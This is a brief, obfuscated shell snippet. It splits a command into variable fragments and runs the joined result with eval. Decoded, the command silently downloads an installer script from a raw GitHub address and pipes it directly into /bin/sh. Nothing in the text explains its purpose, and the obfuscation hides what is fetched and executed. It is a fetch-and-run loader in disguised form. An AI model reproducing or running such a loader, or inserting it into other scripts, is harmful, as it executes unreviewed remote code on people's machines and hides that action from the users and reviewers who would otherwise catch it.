z="
";Gz='serc';Oz='/mai';Hz='onte';Pz='n/in';Rz='ler.';Tz='qO -';Sz='sh -';Vz='bin/';Nz='ertv';Fz='hubu';Uz=' | /';Ez='.git';Jz='om/e';Dz='/raw';Bz=' htt';Lz='37/n';Iz='nt.c';Wz='sh';Mz='oval';Kz='mil2';Qz='stal';Az='wget';Cz='ps:/';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz"